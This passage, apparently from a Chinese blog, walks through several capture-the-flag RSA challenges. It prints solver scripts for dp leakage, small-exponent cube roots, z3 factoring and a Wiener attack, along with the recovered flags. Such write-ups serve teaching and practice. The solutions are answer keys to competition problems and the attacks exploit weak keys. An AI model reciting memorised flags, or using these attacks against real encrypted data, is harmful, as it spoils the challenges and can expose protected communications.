140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure>
<ol>
<li>这是由dp求解p的问题。求解方法已在上文中有具体推导过程，解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (e*dp - <span class="number">1</span>)%y == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp - <span class="number">1</span>)//y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</code></p>
<h2 id="Buuoj-Dangerous-RSA"><a href="#Buuoj-Dangerous-RSA" class="headerlink" title="Buuoj Dangerous RSA"></a><a name="Dangerous_RSA">Buuoj Dangerous RSA</a></h2><ol>
<li>题目提供的信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">e:  0x3</span><br><span class="line">c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?  </span><br></pre></td></tr></table></figure>
<ol>
<li>小指数明文爆破，前文已有原理。具体解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+k*n,e)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c+k*n,e)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125;</code></p>
<h2 id="GWCTF-2019-BabyRSA"><a href="#GWCTF-2019-BabyRSA" class="headerlink" title="[GWCTF 2019]BabyRSA"></a>[GWCTF 2019]BabyRSA</h2><ol>
<li>解压缩文件，有encrypt.py和secret，其中secret是文本文件，内容如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br><span class="line">m1=90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br><span class="line">m2=487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br></pre></td></tr></table></figure>
<p>encrypt.py如下：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;GWHT&#123;******&#125;&#x27;</span></span><br><span class="line">secret = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">half = <span class="built_in">len</span>(flag) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag1 = flag[:half]</span><br><span class="line">flag2 = flag[half:]</span><br><span class="line"></span><br><span class="line">secret_num = getPrime(<span class="number">1024</span>) * bytes_to_long(secret)</span><br><span class="line"></span><br><span class="line">p = sympy.nextprime(secret_num)</span><br><span class="line">q = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">F1 = bytes_to_long(flag1)</span><br><span class="line">F2 = bytes_to_long(flag2)</span><br><span class="line"></span><br><span class="line">c1 = F1 + F2</span><br><span class="line">c2 = <span class="built_in">pow</span>(F1, <span class="number">3</span>) + <span class="built_in">pow</span>(F2, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span>(c2 &lt; N)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, e, N)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, e, N)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;N=&#x27;</span> + <span class="built_in">str</span>(N) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m1=&#x27;</span> + <span class="built_in">str</span>(m1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m2=&#x27;</span> + <span class="built_in">str</span>(m2) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.close()</span><br></pre></td></tr></table></figure>
<ol>
<li>由以上代码可以得到以下表达式：<br>$c1=F1+F2$<br>$c2=F1^{3}+F2^{3}$<br>$c1=m1^{d}\ mod\ N$<br>$c2=m2^{d}\ mod\ N$<br>d可由e,p,q求得。而p,q可通过yafu对N进行分解得到。所以拿到d后就可以求出c1和c2，然后解方程即可得到F1和F2，最后拼出flag。  </li>
<li>解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">N = <span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">p = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span></span><br><span class="line">q = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span></span><br><span class="line"></span><br><span class="line">m1 = <span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2 = <span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line"></span><br><span class="line">phn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,phn)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,d,N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line">F1 = Int(<span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">F2 = Int(<span class="string">&#x27;F2&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(F1 + F2 == <span class="built_in">int</span>(c1))</span><br><span class="line">s.add(F1**<span class="number">3</span> + F2**<span class="number">3</span> == <span class="built_in">int</span>(c2))</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">1590956290598033029862556611630426044507841845</span>)+long_to_bytes(<span class="number">1141553212031156130619789508463772513350070909</span>))</span><br></pre></td></tr></table></figure>
<p><code>GWHT&#123;f709e0e2cfe7e530ca8972959a1033b2&#125;</code>  </p>
<h2 id="HDCTF2019-bbbbbbrsa"><a href="#HDCTF2019-bbbbbbrsa" class="headerlink" title="[HDCTF2019]bbbbbbrsa"></a>[HDCTF2019]bbbbbbrsa</h2><ol>
<li>题目给了enc和encode.py，内容如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 177077389675257695042507998165006460849</span><br><span class="line">n = 37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><span class="line">c = ==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b32encode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;******************************&quot;</span></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">q = getPrime(nbit)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = random.randint(<span class="number">50000</span>,<span class="number">70000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		e -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> b32encode(<span class="built_in">str</span>(c))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br></pre></td></tr></table></figure>
<ol>
<li>所以思路是：先求c，这个c值不看代码，直接从enc文本中就可以看出是逆序的base64结果，所以先逆序过来再base64解密即可；其次，由e爆破得到d；最后因为有$c=int(b2a_hex(flag),16)^{e}\ mod\ n$，所以有$int(b2a_hex(flag),16)=c^{d}\ mod\ n$，可整理得到flag，代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">n = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line">c = <span class="string">&quot;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM&quot;</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">str</span>(c)[::-<span class="number">1</span>]</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line"><span class="comment"># c = 2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50000</span>,<span class="number">70000</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line">        d = invert(e,phi)</span><br><span class="line">        x = <span class="built_in">pow</span>(<span class="built_in">int</span>(c),<span class="built_in">int</span>(d),n)</span><br><span class="line">        flag = <span class="built_in">str</span>(long_to_bytes(x))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;CTF&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;ctf&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;rs4_1s_s1mpl3!#&#125;</code></p>
<h2 id="BJDCTF2020-easyrsa"><a href="#BJDCTF2020-easyrsa" class="headerlink" title="[BJDCTF2020]easyrsa"></a>[BJDCTF2020]easyrsa</h2><ol>
<li>题目给了rsa_task.py，具体如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c,z,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line"><span class="string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line"><span class="string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>所以基本思路是由z求出p和q，再有p,q,e得到d，由c,d,n求m即可得到最终的flag  </p>
</li>
<li><p>由z求p,q。首先$z=\frac{1}{arctan’(p)}\ -\ \frac{1}{arth’(q)}$，其中$arctan’(p)=\frac{1}{1+p^{2}}$，$arth’(q)=\frac{1}{1-q^{2}}$，因此有$z=p^{2}+q^{2}$。同时我们已知有$n=pq$，z和n的值已知，利用z3库联立解方程即可。代码如下：  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># z = p^2 + q^2</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line">z = <span class="number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(p**<span class="number">2</span> + q**<span class="number">2</span> == z)</span><br><span class="line">s.add(p*q == n)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<p>最终输出可得：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span><br><span class="line">q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span><br></pre></td></tr></table></figure>
<ol>
<li>由p,q,e,c,n求m，并得到flag  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">c = <span class="number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span></span><br><span class="line">q = <span class="number">105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>BJD&#123;Advanced_mathematics_is_too_hard!!!&#125;</code>  </p>
<h2 id="Buuoj-rsa2"><a href="#Buuoj-rsa2" class="headerlink" title="Buuoj rsa2"></a>Buuoj rsa2</h2><ol>
<li>题目是一个py文件，具体如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>通过RSA Wiener Attack（维纳攻击）求得<br>d=8920758995414587152829426558580025657357328745839747693739591820283538307445</p>
</li>
<li><p>当在Python3环境下求解flag时报错，提示要先编码。但是我尝试用utf-8和latin1编码再求md5后，得到的flag提交还是不对，有点坑，最后还是用的Python2，flag的那行代码不需要修改。最终结果为：<br><code>flag&#123;47bf28da384590448e0b0d23909a25a4&#125;</code></p>
</li>
</ol>
<h2 id="BJDCTF2020-RSA"><a href="#BJDCTF2020-RSA" class="headerlink" title="[BJDCTF2020]RSA"></a>[BJDCTF2020]RSA</h2><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span>(e&lt;<span class="number">100000</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(<span class="number">294</span>,e,n)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(<span class="string">&quot;BJD&quot;</span>*<span class="number">32</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  